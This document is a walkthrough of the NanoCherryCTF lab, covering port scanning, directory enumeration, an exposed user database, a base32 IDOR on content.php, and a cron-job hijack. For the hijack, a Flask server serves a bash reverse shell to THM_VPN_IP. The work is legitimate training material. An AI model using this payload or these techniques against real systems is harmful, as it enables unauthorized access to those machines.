# NanoCherryCTF Walkthrough

## Step 1: Update /etc/hosts and Read the Story

-   **Method:** Go to the `/etc/hosts` folder and add `TARGET_IP` next to `cherryontop.thm`.
-   **Answer:** No answer needed.

## Step 2: Port Scanning

-   First, we will perform a port scan to see which ports are open and if we can gather any useful information from them.

`nmap -sV [TARGET_MACHINE_IP] -T5` 

### Scan Results:

`Starting Nmap 7.94SVN (https://nmap.org) at 2024-10-05 14:34 EEST
Nmap scan report for nano.cherryontop.thm (10.10.232.170)
Host is up (0.092s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 12.36 seconds` 

## Step 3: Directory Enumeration

-   Next, we execute a directory enumeration with the following command:

`gobuster dir -u http://10.10.232.170 -w /usr/share/wordlists/dirb/big.txt` 

### Gobuster Scan Results:
============================================================ Gobuster v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.232.170 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.htaccess (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /css (Status: 301) [Size: 312] [--> http://10.10.232.170/css/] /images (Status: 301) [Size: 315] [--> http://10.10.232.170/images/] /jquery (Status: 301) [Size: 315] [--> http://10.10.232.170/jquery/] /js (Status: 301) [Size: 311] [--> http://10.10.232.170/js/] /server-status (Status: 403) [Size: 278] Progress: 20469 / 20470 (100.00%) =============================================================== Finished ===============================================================`

-   We didn't find anything useful here either.

## Step 4: SSH Login

-   Next, using the provided credentials (username and password), we will connect via SSH:

`ssh notsus@10.10.232.170` 

-   **Password:** `dontbeascriptkiddie`

## Step 5: Check Users

-   After logging in and going to the home directory, we can see that there are four users:
`notsus@nanocherryctf:/home$ ls
bob-boba  chad-cherry  molly-milk  sam-sprinkles` 

## Step 6: Find Subdomains

-   Knowing that `cherryontop.thm` runs on Apache (from the port scan), we will execute the following command to find all subdomains:
`grep -iR ServerName /etc/apache2/sites-enabled/` 

### Results:
`notsus@nanocherryctf:/home$ grep -iR ServerName /etc/apache2/sites-enabled/
/etc/apache2/sites-enabled/a.cherryontop.thm.conf:      # The ServerName directive sets the request scheme, hostname and port that
/etc/apache2/sites-enabled/a.cherryontop.thm.conf:      # redirection URLs. In the context of virtual hosts, the ServerName
/etc/apache2/sites-enabled/a.cherryontop.thm.conf:      #ServerName www.example.com
/etc/apache2/sites-enabled/a.cherryontop.thm.conf:      ServerName cherryontop.thm
/etc/apache2/sites-enabled/b.cherryontop.thm.conf:      # The ServerName directive sets the request scheme, hostname and port that
/etc/apache2/sites-enabled/b.cherryontop.thm.conf:      # redirection URLs. In the context of virtual hosts, the ServerName
/etc/apache2/sites-enabled/b.cherryontop.thm.conf:      #ServerName www.example.com
/etc/apache2/sites-enabled/b.cherryontop.thm.conf:      ServerName nano.cherryontop.thm
grep: /etc/apache2/sites-enabled/000-default.conf: No such file or directory` 

-   After finding `nano.cherryontop.thm`, we will add it to the `/etc/hosts` file and then access the page.

## Step 7: Admin Login

-   From the page, we go to the Admin `login.php` page.
-   At this point, the first thought was SQL injections, but the page does not have such a vulnerability.
-   Searching for directories, I found `/users.db`.

### Gobuster Results for `/users.db`:

`=============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) [+] Url: http://nano.cherryontop.thm [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/customwordlists/top-100-subdomains.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /users.db (Status: 200) [Size: 12288] /login.php (Status: 200) [Size: 2310] Progress: 2019 / 2020 (99.95%) =============================================================== Finished ===============================================================`

-   Examining this file, we can easily find the login credentials:
-   **Username:** `puppet`
-   **Password:** `master`
-   With these, we can log into the admin portal. From there, we find Molly's flag: **Molly's Flag:** THM{B________1}
-   We also get her password to log in via SSH.

## Step 8: Connect to Chad
-   After logging in via SSH, we find `chads-key1.txt`:

`chads-key1.txt: n________y` 

-   Next, we head to the page `http://cherryontop.thm/content.php`.
-   After testing some facts, we notice that the page is vulnerable to an IDOR attack.
-   After analyzing the URL `/content.php?facts=2&user=I52WK43U`, I observed that the user `I52WK43U` is the word `Guest` encrypted with base32.
-   After encrypting all users with base32 using Burp Suite, I found that for Fact 43 of `sam-sprinkles` (`facts=43&user=ONQW2LLTOBZGS3TLNRSXG===`), it displayed the message: `My secret web hideout in case I forget my ssh credentials again`
-   **sam-sprinkles:** `S____________3`
-   After connecting with the above credentials, we also find `chads-key2.txt`:
`chads-key2.txt: w____3` 

## Step 9: Checking Cron Jobs

-   Checking all the crontabs, we see that `bob-boba` has a cron job running every minute.
-   It looks like `bob-boba` is trying to fetch a script from `cherryontop.tld:8000` and execute it.
-   After adding the `THM_VPN_IP cherryontop.tld` to `/etc/hosts`, we can now host a simple Flask server to serve the `coinflip.sh` script with reverse shell content.
### `exploit.py`:
`from flask import Flask
app = Flask(__name__)

@app.route('/home/bob-boba/coinflip.sh')
def hello_world():
    return """#!/bin/bash
bash -c 'bash -i >& /dev/tcp/THM_VPN_IP/4444 0>&1'
"""
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)` 

-   Meanwhile, we also open a listener.

## Step 10: Gaining Access

-   After getting access to `bob-boba`, we find the last key:

  `chads-key3.txt: 7_______3` 

-   Finally, we can log in via SSH with `chad-cherry` using all keys obtained, and find `chad's flag`:
- 
`THM{I_W_______T}`